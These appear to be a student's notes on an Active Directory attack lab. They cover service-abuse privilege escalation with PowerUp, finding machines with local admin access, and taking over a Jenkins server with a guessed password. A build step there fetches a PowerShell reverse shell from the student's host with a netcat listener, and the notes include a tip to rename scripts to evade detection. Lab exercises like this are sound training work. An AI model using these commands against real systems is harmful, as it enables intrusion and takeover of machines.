# LEARNING OBJECTIVE 5

1. Exploit a service on dcorp-studentx and elevate privileges to local administrator.

- PowerUp

`. .\PowerUp.ps1`
```
Invoke-AllChecks | select servicename,path,abusefunction

ServiceName    Path                                               AbuseFunction
-----------    ----                                               -------------
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Install-ServiceBinary -Name 'AbyssWebServer'
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Install-ServiceBinary -Name 'AbyssWebServer'
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Install-ServiceBinary -Name 'AbyssWebServer'
edgeupdate     "C:\Program Files (x86)\Microsoft\EdgeUpdate\Mi... Install-ServiceBinary -Name 'edgeupdate'
edgeupdate     "C:\Program Files (x86)\Microsoft\EdgeUpdate\Mi... Install-ServiceBinary -Name 'edgeupdate'
edgeupdatem    "C:\Program Files (x86)\Microsoft\EdgeUpdate\Mi... Install-ServiceBinary -Name 'edgeupdatem'
edgeupdatem    "C:\Program Files (x86)\Microsoft\EdgeUpdate\Mi... Install-ServiceBinary -Name 'edgeupdatem'
AbyssWebServer C:\WebServer\Abyss Web Server\abyssws.exe -service Invoke-ServiceAbuse -Name 'AbyssWebServer'
SNMPTRAP       C:\Windows\System32\snmptrap.exe                   Invoke-ServiceAbuse -Name 'SNMPTRAP'
                                                                  Write-HijackDll -DllPath 'C:\Users\student214\AppData\Loca...
```

```
Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName 'dcorp\student214' -Verbose
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student214 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\student214 /add'
VERBOSE: Restoring original path to service 'AbyssWebServer'
VERBOSE: binPath for AbyssWebServer successfully set to 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Leaving service 'AbyssWebServer' in stopped state

ServiceAbused  Command
-------------  -------
AbyssWebServer net localgroup Administrators dcorp\student214 /add
```
`NOTE: Dont forget to relogin to apply changes`

- WinPeas

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

- PrivEscCheck

`. C:\AD\Tools\PrivEscCheck.ps1`

```
Invoke-PrivescCheck
```

2. Identify a machine in the domain where studentx has local administrative access.

`Dont forget to run invisishell`

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess
dcorp-std214
dcorp-adminsrv
WARNING: Something went wrong. Check the settings, confirm hostname, etc. Connecting to remote server dcorp-std216.dollarcorp.moneycorp.local failed with the following error message :
WinRM cannot complete the operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and that a firewall exception for the WinRM
service is enabled and allows access from this computer. By default, the WinRM firewall exception for public profiles limits access to remote computers within the same local subnet. For
 more information, see the about_Remote_Troubleshooting Help topic.
```

Connect using winrs:
`winrs -r:dcorp-adminsrv cmd`
or using PowerShell remoting:
`Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local`


3. Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

Access Jenkins

login as builduser with password `builduser` because a lot of jenkins user use their username as password

Select a project and configure

Add build step -> Execute windows batch command

Execute reverse shell, for example with `Invoke-PowerShellTcp.ps1`

`powershell.exe iex (iwr http://172.16.100.214/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.214 -Port 443`

`C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`

`NOTE: change the script name to evade detection, use hfs.exe to host the server locally`

Double check the following:
1. Remember to host the reverse shell on a local web server on your student VM. You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
2. Also, make sure to add an exception or turn off the firewall on the student VM.
3. Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
4. After you build the project below, check the 'Console Output' of the Jenkins Project to know more about the error.
5. On the student VM, run a netcat or powercat listener which listens on the port which we used above (443):
